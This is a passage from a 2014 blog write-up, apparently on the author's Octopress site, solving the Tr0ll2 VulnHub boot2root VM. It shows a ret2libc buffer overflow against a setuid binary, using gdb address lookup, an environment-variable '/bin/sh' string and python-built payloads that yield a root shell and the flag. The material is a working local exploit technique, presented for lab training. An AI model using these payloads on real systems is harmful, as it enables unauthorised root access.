+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ gdb r00t 
+</span><span class='line'>GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+</span><span class='line'>Copyright (C) 2012 Free Software Foundation, Inc.
+</span><span class='line'>License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
+</span><span class='line'>This is free software: you are free to change and redistribute it.
+</span><span class='line'>There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+</span><span class='line'>and "show warranty" for details.
+</span><span class='line'>This GDB was configured as "i686-linux-gnu".
+</span><span class='line'>For bug reporting instructions, please see:
+</span><span class='line'>&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
+</span><span class='line'>Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
+</span><span class='line'>(gdb) run
+</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door3/r00t 
+</span><span class='line'>Usage: /nothing_to_see_here/choose_wisely/door3/r00t input
+</span><span class='line'>[Inferior 1 (process 2379) exited normally]
+</span><span class='line'>(gdb) p system
+</span><span class='line'>$1 = {&lt;text variable, no debug info&gt;} 0x40069060 &lt;system&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Cool, we know where the system function call resides (0x40069060), now - what do we want to call? How about <code>/bin/sh</code>? There&rsquo;s one problem though - when passing it as an argument to <code>system()</code>, we need to pass an address of the string going in as argument.</p>
+
+<p>There are couple of options - we can either try to find it in existing environment variables (but it may be hard as the string we want may not be there and we would need to be exact regarding its memory address to be able to extract it) or we can simply create new environment variable with whatever value we want and pass that in!</p>
+
+<p>Going with the second option, we control what value we want to pass in and we can also do a variety of a NOP sled as in the previous example.</p>
+
+<p>As before, let&rsquo;s create an environment variable to use as an argument to our <code>system()</code> call.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ export EGG=//////////////////////////////////////////////////////bin/sh</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Number of <code>/</code> acts as a NOP sled, we can land anywhere on them and the exploit will still work, thus, we don&rsquo;t need to be super specific about the string&rsquo;s memory location.</p>
+
+<p>Now we just need it&rsquo;s address and we are ready to rock! Let&rsquo;s use the same <code>egghunt</code> program as in the previous example.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/egghunt 
+</span><span class='line'>EGG address 0xbffffe93</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Awesome! Let&rsquo;s craft our exploit - again, we&rsquo;ll need (in sequence):</p>
+
+<ul>
+<li>268 bytes of dummy data</li>
+<li>address of system</li>
+<li>4 bytes of dummy data</li>
+<li>address of /bin/sh string</li>
+</ul>
+
+
+<p>Let&rsquo;s do it!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\x93\xfe\xff\xbf"')
+</span><span class='line'>Segmentation fault
+</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\xa3\xfe\xff\xbf"')
+</span><span class='line'>sh: 1: s/0: not found
+</span><span class='line'>Segmentation fault
+</span><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\xb3\xfe\xff\xbf"')
+</span><span class='line'># whoami
+</span><span class='line'>root
+</span><span class='line'># </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Got it! On the 3rd try, didn&rsquo;t seem to be able to guess EGG address that effectively this time, but at the end of the day it worked! :) Now you see why having a decent size NOP sled helps, otherwise, we would need to find <em>EXACT</em> address where it starts&hellip; in some situations it could be pretty hard if not impossible to do!</p>
+
+<p>Oh, right, let&rsquo;s get the flag!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cd /root
+</span><span class='line'># ls
+</span><span class='line'>core1  core2  core3  core4  goal  hardmode  lmao.zip  Proof.txt  ran_dir.py  reboot
+</span><span class='line'># cat Proof.txt
+</span><span class='line'>You win this time young Jedi...
+</span><span class='line'>
+</span><span class='line'>a70354f0258dcc00292c72aab3c8b1e4  </span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Summary</h2>
+
+<p>Quite fun challange! Was a bit frustrating at times, especially at the password guessing bit for FTP server, if only &ldquo;Tr0ll&rdquo; was one of the entries in the answer.txt file, that would save me quite some time trying to guess FTP username and password&hellip; oh well, Trolls will be Trolls :) Thanks <a href="https://twitter.com/maleus21">Maleus</a> for coming up with it and <a href="http://www.vulnhub.com">VulnHub</a> for hosting it!</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Knapsy</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2014-10-28T19:57:51+11:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>28</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>7:57 pm</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/boot2root/'>boot2root</a>, <a class='category' href='/blog/categories/buffer-overflow/'>buffer overflow</a>, <a class='category' href='/blog/categories/pentesting/'>pentesting</a>, <a class='category' href='/blog/categories/ret2libc/'>ret2libc</a>, <a class='category' href='/blog/categories/shellshock/'>shellshock</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>, <a class='category' href='/blog/categories/writeup/'>writeup</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://knapsy.github.io/blog/2014/10/28/beating-the-troll-tr0ll2-writeup/" data-via="TheKnapsy" data-counturl="http://knapsy.github.io/blog/2014/10/28/beating-the-troll-tr0ll2-writeup/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/10/16/knock-knock-vm-walkthrough/" title="Previous Post: Knock-Knock VM walkthrough">&laquo; Knock-Knock VM walkthrough</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/11/05/kvasir-vm-writeup/" title="Next Post: Kvasir VM writeup">Kvasir VM writeup &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>About Me</h1>
+  <p><img src="https://pbs.twimg.com/profile_images/511488232572207105/wmx1Ld7X_bigger.jpeg" align="right"/><strong>Knapsy</strong> (<u><a href="http://twitter.com/TheKnapsy">@TheKnapsy</a></u>)<br/>
+  IT security guy, software engineer, basketballer, coffee enthusiast. Creative, a bit crazy, sleep deprived.</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2015/03/29/oscp-thoughts-and-tips/">OSCP - Thoughts and Tips</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/12/16/pegasus-has-arrived-my-first-boot2root-vm/">Pegasus Has Arrived - My First Boot2root VM</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/17/png-from-hell-ruxcon-ctf-challenge/">PNG From Hell - Ruxcon CTF Challenge</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/05/kvasir-vm-writeup/">Kvasir VM Writeup</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/28/beating-the-troll-tr0ll2-writeup/">Beating the Troll - Tr0ll2 Writeup</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>Latest Tweets</h1>
+  <p><a class="twitter-timeline" href="https://twitter.com/TheKnapsy" data-widget-id="517677537711767552">Tweets by @TheKnapsy</a></p>
+  <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+</section>
+
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2015 - Knapsy -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'knapsysbraindump';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://knapsy.github.io/blog/2014/10/28/beating-the-troll-tr0ll2-writeup/';
+        var disqus_url = 'http://knapsy.github.io/blog/2014/10/28/beating-the-troll-tr0ll2-writeup/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
